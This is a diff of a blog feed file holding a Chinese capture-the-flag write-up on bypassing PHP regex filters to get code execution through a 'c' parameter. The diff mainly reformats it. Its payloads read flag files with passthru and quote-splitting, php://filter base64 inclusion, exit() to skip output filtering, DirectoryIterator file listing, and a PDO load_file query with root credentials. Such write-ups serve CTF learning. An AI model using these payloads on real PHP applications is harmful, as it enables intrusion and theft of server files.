@@ -15,23 +15,23 @@
     <content><![CDATA[<blockquote>
 <p>if(!preg_match(“/flag|system|php/i”, $c)){</p>
 </blockquote>
-<p><strong>过滤了文件名，系统命令执行函数，php</strong></p>
+<p>&ensp;<strong>过滤了文件名，系统命令执行函数，php</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;nl fl&#x27;&#x27;ag.ph&#x27;&#x27;p&quot;);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;/i”, $c)){</p>
 </blockquote>
-<p><strong>过滤了文件名、system、php、cat、sort、shell、点号、空格、单引号</strong></p>
+<p>&ensp;<strong>过滤了文件名、system、php、cat、sort、shell、点号、空格、单引号</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;nl%09`ls`&quot;);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(/i”, $c)){</p>
 </blockquote>
-<p><strong>过滤了flag、system、php、cat、sort、shell、点号、空格、单引号、反引号、echo、；、左括号</strong></p>
+<p>&ensp;<strong>过滤了flag、system、php、cat、sort、shell、点号、空格、单引号、反引号、echo、；、左括号</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64- encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p><strong>先闭合，再写php代码</strong></p>
+<p>&ensp;<strong>先闭合，再写php代码</strong></p>
 <blockquote>
 <p>过滤数字时</p>
 </blockquote>
@@ -55,23 +55,16 @@
 <p>将缓冲区数据获取给$s,再清楚,然后将数字小写字母全变为?</p>
 </blockquote>
 <ul>
-<li><p>这里通过exit();使程序提前退出，绕过后面的正则表达式</p>
-</li>
-<li><p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>
+<li>这里通过exit();使程序提前退出，绕过后面的正则表达式</li>
+<li>payload:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>scandir被禁用,使用DirectoryIterator类</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $key=&gt;$value)&#123;echo $key.&quot;=&gt;&quot;.$value;&#125;;exit(0);?&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; 用sql语句读取数据库文件</span><br></pre></td></tr></table></figure>
-<p>c=<br>try {<br>  $dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’,</p>
-<pre><code>  &#39;root&#39;);
+c=<br>try { $dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’,<pre><code>  &#39;root&#39;); foreach ($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null; &#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0); &#125; exit(0);
 </code></pre>
-<p>  foreach ($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {</p>
-<pre><code>  echo ($row[0]) . &quot;|&quot;;
-</code></pre>
-<p>  }<br>  $dbh = null;<br>} catch (PDOException $e) {<br>  echo $e-&gt;getMessage();<br>  exit(0);<br>}<br>exit(0);<br>```</p>
-</li>
+```</li>
 </ul>
 ]]></content>
       <categories>
